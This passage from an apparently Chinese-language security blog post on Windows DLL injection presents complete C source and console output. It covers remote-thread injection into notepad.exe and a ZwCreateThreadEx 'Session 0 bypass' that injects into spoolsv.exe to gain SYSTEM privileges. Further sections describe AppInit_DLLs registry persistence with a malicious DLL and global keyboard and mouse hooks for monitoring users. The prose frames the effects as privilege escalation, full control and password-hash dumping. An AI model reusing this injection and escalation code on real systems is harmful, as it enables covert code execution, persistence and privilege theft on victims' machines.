class="meta">#<span class="keyword">include</span> <span class="string">&quot;injector.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行 DLL 注入的核心逻辑</span></span><br><span class="line">BOOL <span class="title function_">InjectDLL</span><span class="params">(DWORD pid, <span class="type">wchar_t</span>* dllPath)</span> &#123;</span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    <span class="keyword">if</span> (!hProcess) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] OpenProcess failed. Error: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> pathLen = (wcslen(dllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>);</span><br><span class="line">    <span class="comment">// 1. 在目标进程分配内存</span></span><br><span class="line">    LPVOID pRemoteMem = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, pathLen, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!pRemoteMem) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] VirtualAllocEx failed.\n&quot;</span>);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 写入 DLL 路径</span></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess, pRemoteMem, dllPath, pathLen, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] WriteProcessMemory failed.\n&quot;</span>);</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. PEB Walking 获取 Kernel32 基址 (调用 injector.h 中的函数)</span></span><br><span class="line">    HMODULE hRemoteKernel32 = GetRemoteModuleHandle(hProcess, <span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hRemoteKernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to find kernel32.dll in target process via PEB.\n&quot;</span>);</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Found Remote Kernel32 Base: 0x%p\n&quot;</span>, (<span class="type">void</span>*)hRemoteKernel32);</span><br><span class="line">    <span class="comment">// 4. 计算 LoadLibraryW 的远程地址</span></span><br><span class="line">    HMODULE hLocalKernel32 = GetModuleHandleW(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    FARPROC pLocalLoadLibrary = GetProcAddress(hLocalKernel32, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">    <span class="comment">// 偏移量计算</span></span><br><span class="line">    <span class="type">uintptr_t</span> offset = (<span class="type">uintptr_t</span>)pLocalLoadLibrary - (<span class="type">uintptr_t</span>)hLocalKernel32;</span><br><span class="line">    LPTHREAD_START_ROUTINE pRemoteLoadLibrary = (LPTHREAD_START_ROUTINE)((<span class="type">uintptr_t</span>)hRemoteKernel32 + offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Calculated Remote LoadLibraryA: 0x%p\n&quot;</span>, pRemoteLoadLibrary);</span><br><span class="line">    <span class="comment">// 5. 创建远程线程</span></span><br><span class="line">    HANDLE hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pRemoteLoadLibrary, pRemoteMem, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] CreateRemoteThread failed. Error: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Remote thread created. Waiting for execution...\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 1. 等待线程结束 (即 LoadLibrary 执行完毕)</span></span><br><span class="line">        WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">        <span class="comment">// 2. 获取线程退出码 (这就是 LoadLibrary 的返回值)</span></span><br><span class="line">        DWORD exitCode = <span class="number">0</span>;</span><br><span class="line">        GetExitCodeThread(hThread, &amp;exitCode);</span><br><span class="line">        <span class="keyword">if</span> (exitCode == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] Injection FAILED. LoadLibrary returned NULL.\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    Possible causes:\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    1. DLL path is incorrect (Target process can&#x27;t find it).\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    2. Architecture mismatch (Injecting 32-bit DLL into 64-bit Process).\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    3. Dependency missing.\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Injection SUCCESS. Remote DLL Handle: 0x%lX\n&quot;</span>, exitCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;[+] Remote thread created successfully.\n&quot;);</span></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">    <span class="comment">// 清理</span></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">wchar_t</span>* targetProcessName = <span class="string">L&quot;notepad.exe&quot;</span>;</span><br><span class="line">    <span class="type">wchar_t</span> dllPath[MAX_PATH];</span><br><span class="line">    <span class="comment">// 使用 GetFullPathNameW</span></span><br><span class="line">    <span class="keyword">if</span> (GetFullPathNameW(<span class="string">L&quot;MessageboxDll.dll&quot;</span>, MAX_PATH, dllPath, <span class="literal">NULL</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Failed to get full path of DLL. Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用 injector.h 中的函数</span></span><br><span class="line">    DWORD pid = GetProcessIdByName(targetProcessName);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Process not found. Make sure it is running.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Target PID: %lu\n&quot;</span>, pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Attempting injection via PEB walking (Compact Version)...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (InjectDLL(pid, dllPath)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Injection sequence completed successfully.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Injection failed.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="1-4-攻击效果"><a href="#1-4-攻击效果" class="headerlink" title="1.4 攻击效果"></a>1.4 攻击效果</h4><ul>
<li><strong>效果</strong> ：能够控制任何当前用户权限下的普通进程（如 Notepad, Chrome）。</li>
<li><strong>局限</strong> ：在 Windows Vista 以后，由于 Session 0 隔离机制，无法使用此 API 向系统服务注入。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Exploooosion\Desktop&gt; .\Project4.exe                                                                        [+] Target PID: 9204                                                                                                    [*] Attempting injection via PEB walking (Compact Version)...                                                           [+] Found Remote Kernel32 Base: 0x00007FF8AABC0000                                                                      [+] Calculated Remote LoadLibraryA: 0x00007FF8AABE0220                                                                  [+] Remote thread created. Waiting for execution...                                                                     [+] Injection SUCCESS. Remote DLL Handle: 0x64780000                                                                    [+] Injection sequence completed successfully.  </span><br></pre></td></tr></table></figure>

<p><img src="/image/2025-12-12-windows_dll_injection/1765524982009.png" alt="1765524982009"></p>
<h3 id="突破-Session-0-隔离注入-Session-0-Bypass"><a href="#突破-Session-0-隔离注入-Session-0-Bypass" class="headerlink" title="突破 Session 0 隔离注入 (Session 0 Bypass)"></a>突破 Session 0 隔离注入 (Session 0 Bypass)</h3><p>针对系统服务和高权限进程的注入技术。</p>
<h4 id="技术原理-1"><a href="#技术原理-1" class="headerlink" title="技术原理"></a>技术原理</h4><p>Windows 将服务和系统核心进程运行在 Session 0，而用户进程运行在 Session 1+。<code>CreateRemoteThread</code> 在跨 Session 操作时会失败。此技术通过调用底层的 Native API (<code>ZwCreateThreadEx</code>) 直接与内核交互，绕过 Win32 子系统的 Session 检查。</p>
<h4 id="实现方法与流程-参考-session0bypass-c"><a href="#实现方法与流程-参考-session0bypass-c" class="headerlink" title="实现方法与流程 (参考 session0bypass.c)"></a>实现方法与流程 (参考 <code>session0bypass.c</code>)</h4><p>流程的前半部分（打开进程、分配内存、写入路径）与经典注入完全一致。唯一的区别在于最后一步“创建线程”的方式。</p>
<h4 id="核心-API-及作用"><a href="#核心-API-及作用" class="headerlink" title="核心 API 及作用"></a>核心 API 及作用</h4><ul>
<li><code>OpenProcess</code> &#x2F; <code>VirtualAllocEx</code> &#x2F; <code>WriteProcessMemory</code>：作用同上。</li>
<li><code>GetModuleHandle(&quot;ntdll.dll&quot;)</code> &amp; <code>GetProcAddress</code>：获取 <code>ntdll.dll</code> 中的未文档化函数地址。</li>
<li><code>ZwCreateThreadEx(...)</code>： <strong>核心触发点</strong> 。这是一个内核级 API，比 <code>CreateRemoteThread</code> 更底层。它允许在特定的标志位设置下，忽略 Session 隔离限制，在 Session 0 的进程（如 <code>spoolsv.exe</code>, <code>svchost.exe</code>）中创建线程。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;injector.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行 DLL 注入的核心逻辑</span></span><br><span class="line">BOOL <span class="title function_">InjectDLL</span><span class="params">(DWORD pid, <span class="type">const</span> <span class="type">wchar_t</span>* dllPath)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 获取目标进程句柄</span></span><br><span class="line">    <span class="comment">// 注意：操作 Session 0 服务进程通常需要 SeDebugPrivilege</span></span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    <span class="keyword">if</span> (!hProcess) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] OpenProcess failed. Error: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> pathLen = (wcslen(dllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>);</span><br><span class="line">    <span class="comment">// 2. 在目标进程分配内存</span></span><br><span class="line">    LPVOID pRemoteMem = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, pathLen, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!pRemoteMem) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] VirtualAllocEx failed.\n&quot;</span>);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 写入 DLL 路径</span></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess, pRemoteMem, (LPVOID)dllPath, pathLen, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] WriteProcessMemory failed.\n&quot;</span>);</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4. PEB Walking 获取 Kernel32 基址</span></span><br><span class="line">    HMODULE hRemoteKernel32 = GetRemoteModuleHandle(hProcess, <span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hRemoteKernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to find kernel32.dll in target process via PEB.\n&quot;</span>);</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Found Remote Kernel32 Base: 0x%p\n&quot;</span>, (<span class="type">void</span>*)hRemoteKernel32);</span><br><span class="line">    <span class="comment">// 5. 计算 LoadLibraryW 的远程地址</span></span><br><span class="line">    HMODULE hLocalKernel32 = GetModuleHandleW(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    FARPROC pLocalLoadLibrary = GetProcAddress(hLocalKernel32, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">    <span class="type">uintptr_t</span> offset = (<span class="type">uintptr_t</span>)pLocalLoadLibrary - (<span class="type">uintptr_t</span>)hLocalKernel32;</span><br><span class="line">    LPTHREAD_START_ROUTINE pRemoteLoadLibrary = (LPTHREAD_START_ROUTINE)((<span class="type">uintptr_t</span>)hRemoteKernel32 + offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Calculated Remote LoadLibraryW: 0x%p\n&quot;</span>, pRemoteLoadLibrary);</span><br><span class="line">    <span class="comment">// ============================================================</span></span><br><span class="line">    <span class="comment">//         使用 ZwCreateThreadEx 绕过 Session 0 隔离</span></span><br><span class="line">    <span class="comment">// ============================================================</span></span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE hNtdll = GetModuleHandleW(<span class="string">L&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hNtdll) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to load ntdll.dll\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取 ZwCreateThreadEx 地址</span></span><br><span class="line">    typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!ZwCreateThreadEx) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] GetProcAddress for ZwCreateThreadEx failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Calling ZwCreateThreadEx to bypass Session 0 isolation...\n&quot;</span>);</span><br><span class="line">    DWORD status = ZwCreateThreadEx(</span><br><span class="line">        &amp;hThread, </span><br><span class="line">        PROCESS_ALL_ACCESS, </span><br><span class="line">        <span class="literal">NULL</span>, </span><br><span class="line">        hProcess, </span><br><span class="line">        pRemoteLoadLibrary, </span><br><span class="line">        pRemoteMem, </span><br><span class="line">        <span class="number">0</span>, <span class="comment">// Flags / CreateSuspended = 0</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (status != <span class="number">0</span>) &#123; <span class="comment">// 0 表示 STATUS_SUCCESS</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] ZwCreateThreadEx failed. Status: 0x%lx\n&quot;</span>, status);</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Remote thread created successfully via Native API.\n&quot;</span>);</span><br><span class="line">        WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">        DWORD exitCode = <span class="number">0</span>;</span><br><span class="line">        GetExitCodeThread(hThread, &amp;exitCode);</span><br><span class="line">        <span class="keyword">if</span> (exitCode == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] Injection FAILED. LoadLibrary returned NULL.\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Injection SUCCESS. Remote DLL Handle: 0x%lX\n&quot;</span>, exitCode);</span><br><span class="line">        &#125;</span><br><span class="line">  </span><br><span class="line">        CloseHandle(hThread);</span><br><span class="line">    &#125;</span><br><span class="line">    VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="comment">// 默认目标改为 spoolsv.exe 以测试 Session 0 注入</span></span><br><span class="line">    <span class="type">const</span> <span class="type">wchar_t</span>* targetProcessName = <span class="string">L&quot;spoolsv.exe&quot;</span>; </span><br><span class="line">    <span class="type">wchar_t</span> dllPath[MAX_PATH];</span><br><span class="line">    <span class="keyword">if</span> (!EnableDebugPrivilege()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to enable SeDebugPrivilege. Run as Administrator!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] SeDebugPrivilege Enabled.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (GetFullPathNameW(<span class="string">L&quot;MessageboxDllforSystem.dll&quot;</span>, MAX_PATH, dllPath, <span class="literal">NULL</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;[-] Failed to get full path of DLL. Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查找 PID</span></span><br><span class="line">    wprintf(<span class="string">L&quot;[*] Searching for process: %s\n&quot;</span>, targetProcessName);</span><br><span class="line">    DWORD pid = GetProcessIdByName(targetProcessName);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Process not found. Make sure it is running.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Target PID: %lu\n&quot;</span>, pid);</span><br><span class="line">    <span class="comment">// 执行注入</span></span><br><span class="line">    <span class="keyword">if</span> (InjectDLL(pid, dllPath)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Injection sequence completed successfully.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Injection failed.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="攻击效果-最厉害的效果"><a href="#攻击效果-最厉害的效果" class="headerlink" title="攻击效果 (最厉害的效果)"></a>攻击效果 (最厉害的效果)</h4><ul>
<li><strong>权限提升 (Privilege Escalation)</strong> ：成功注入系统服务后，DLL 将获得 <strong>SYSTEM (NT AUTHORITY\SYSTEM)</strong> 权限。</li>
<li><strong>完全控制</strong> ：这是 Windows 系统中的最高权限，可以无限制地修改系统文件、注册表，甚至转储密码哈希 (LSASS)。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Exploooosion\Desktop&gt; .\Project4.exe                                                                        [+] SeDebugPrivilege Enabled.                                                                                           [*] Searching for process: spoolsv.exe                                                                                  [+] Target PID: 4816                                                                                                    [+] Found Remote Kernel32 Base: 0x00007FF8AABC0000                                                                      [+] Calculated Remote LoadLibraryW: 0x00007FF8AABE0220                                                                  [*] Calling ZwCreateThreadEx to bypass Session 0 isolation...                                                           [+] Remote thread created successfully via Native API.                                                                  [+] Injection SUCCESS. Remote DLL Handle: 0x658C0000                                                                    [+] Injection sequence completed successfully.  </span><br><span class="line">========================================</span><br><span class="line">[+] Time: (New Injection Event)</span><br><span class="line">[+] Process ID   : 4816</span><br><span class="line">[+] Session ID   : 0 (0 means System Service Session)</span><br><span class="line">[+] Current User : SYSTEM</span><br><span class="line">[RESULT] -&gt; SUCCESS! Running as NT AUTHORITY\SYSTEM</span><br><span class="line">========================================</span><br></pre></td></tr></table></figure>

<p><img src="/image/2025-12-12-windows_dll_injection/1765532204002.png" alt="1765532204002"></p>
<h3 id="注册表注入-Registry-Modification"><a href="#注册表注入-Registry-Modification" class="headerlink" title="注册表注入 (Registry Modification)"></a>注册表注入 (Registry Modification)</h3><p>利用 Windows 加载机制的“被动”注入，常用于持久化。</p>
<h4 id="技术原理-2"><a href="#技术原理-2" class="headerlink" title="技术原理"></a>技术原理</h4><p>Windows 的 <code>User32.dll</code> 在初始化时会读取特定的注册表键值。如果配置了 <code>AppInit_DLLs</code>，所有加载 <code>User32.dll</code> 的进程（即几乎所有 GUI 程序）在启动时都会自动加载列表中的 DLL。</p>
<h4 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h4><p>不依赖内存操作 API，而是通过修改注册表键值。</p>
<ul>
<li>路径：<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows</code></li>
<li>操作：设置 <code>LoadAppInit_DLLs</code> 为 1，并在 <code>AppInit_DLLs</code> 中填入恶意 DLL 路径。</li>
</ul>
<h4 id="核心-API-及作用-1"><a href="#核心-API-及作用-1" class="headerlink" title="核心 API 及作用"></a>核心 API 及作用</h4><ul>
<li><code>RegOpenKeyEx</code> &#x2F; <code>RegSetValueEx</code>：用于修改注册表键值。</li>
<li><code>User32.dll</code> (系统机制)：当它被加载时，会自动解析上述注册表项并调用 <code>LoadLibrary</code>。</li>
</ul>
<h4 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h4><ul>
<li><strong>持久化 (Persistence)</strong> ：重启后依然有效。</li>
<li><strong>广撒网</strong> ：系统中几乎所有有界面的程序都会被注入，无需针对特定 PID。</li>
<li><em>注：在开启 Secure Boot 的现代系统中，此功能通常被禁用。</em></li>
</ul>
<h3 id="消息钩子注入-SetWindowsHookEx"><a href="#消息钩子注入-SetWindowsHookEx" class="headerlink" title="消息钩子注入 (SetWindowsHookEx)"></a>消息钩子注入 (SetWindowsHookEx)</h3><p>利用 Windows 消息传递机制的注入，常用于监控用户行为。</p>
<h4 id="技术原理-3"><a href="#技术原理-3" class="headerlink" title="技术原理"></a>技术原理</h4><p>Windows 允许程序安装“钩子”来截获系统消息（如键盘、鼠标事件）。如果安装的是 <strong>全局钩子</strong> （Global Hook），操作系统为了让回调函数能处理其他进程的消息，必须将包含回调函数的 DLL 强制映射到所有接收该消息的进程空间中。</p>
<h4 id="实现方法与流程-参考-hookinjection-c-GlobalHookDll-c"><a href="#实现方法与流程-参考-hookinjection-c-GlobalHookDll-c" class="headerlink" title="实现方法与流程 (参考 hookinjection.c, GlobalHookDll.c)"></a>实现方法与流程 (参考 <code>hookinjection.c</code>, <code>GlobalHookDll.c</code>)</h4><ol>
<li><strong>编写 DLL</strong> ：DLL 中必须包含钩子回调函数（如 <code>MyHookProc</code>）和导出安装函数。</li>
<li><strong>安装钩子</strong> ：加载器（Loader）加载 DLL，获取回调函数地址，调用 <code>SetWindowsHookEx</code>。</li>
<li><strong>触发注入</strong> ：一旦发生相关事件（如鼠标移动、按键），OS 自动将 DLL 注入到受影响的进程。</li>
</ol>
<h4 id="核心-API-及作用-2"><a href="#核心-API-及作用-2" class="headerlink" title="核心 API 及作用"></a>核心 API 及作用</h4><ul>
<li><code>LoadLibrary</code> &#x2F; <code>GetProcAddress</code>：在加载器中加载恶意 DLL 并获取导出函数地址。</li>
<li><code>SetWindowsHookEx(WH_GETMESSAGE, hookProc, hDll, 0)</code>： <strong>核心触发点</strong> 。<ul>
